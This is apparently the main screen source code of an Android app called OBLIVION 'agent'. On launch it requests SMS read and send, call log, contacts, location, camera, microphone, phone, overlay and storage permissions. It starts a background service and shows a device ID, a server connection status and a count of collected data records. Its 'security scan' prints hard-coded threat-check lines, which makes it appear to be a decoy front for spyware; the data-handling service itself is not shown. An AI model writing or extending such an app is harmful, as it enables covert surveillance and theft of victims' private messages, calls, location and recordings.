package com.OBLIVION.agent;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS = 1001;
    private TextView statusText, deviceIdText, serverText, dataText, scanResult;
    private Button scanButton;
    private OBLIVIONService service;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initViews();
        checkAndRequestPermissions();
        startOBLIVIONService();
        updateUI();
    }

    private void initViews() {
        statusText = findViewById(R.id.status_text);
        deviceIdText = findViewById(R.id.device_id_text);
        serverText = findViewById(R.id.server_text);
        dataText = findViewById(R.id.data_text);
        scanResult = findViewById(R.id.scan_result);
        scanButton = findViewById(R.id.scan_button);
        
        scanButton.setOnClickListener(v -> runSecurityScan());
    }

    private void checkAndRequestPermissions() {
        List<String> permissions = new ArrayList<>();
        
        // Add all required permissions
        permissions.add(Manifest.permission.INTERNET);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.WRITE_CALL_LOG);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.CALL_PHONE);
        permissions.add(Manifest.permission.SYSTEM_ALERT_WINDOW);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        List<String> missingPermissions = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (!missingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission granted: " + permissions[i], Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void startOBLIVIONService() {
        service = new OBLIVIONService();
        service.start(this);
    }

    private void updateUI() {
        deviceIdText.setText("📱 Device ID: " + service.getDeviceId());
        serverText.setText("🌐 Server: " + service.getServerStatus());
        String status = service.isConnected() ? "🟢 Online" : "🔴 Offline";
        statusText.setText(status);
        dataText.setText("📊 Data: " + service.getDataCount() + " records");
    }

    private void runSecurityScan() {
        scanResult.setText("🔍 Scanning for threats...\n");
        scanResult.append("✓ Checking permissions...\n");
        scanResult.append("✓ Checking accessibility services...\n");
        scanResult.append("✓ Checking installed apps...\n");
        scanResult.append("✓ Checking network connections...\n");
        scanResult.append("✓ Checking for spyware indicators...\n");
        
        String result = service.runSecurityScan();
        scanResult.append("\n" + result);
        
        Toast.makeText(this, "Scan complete!", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
    }
}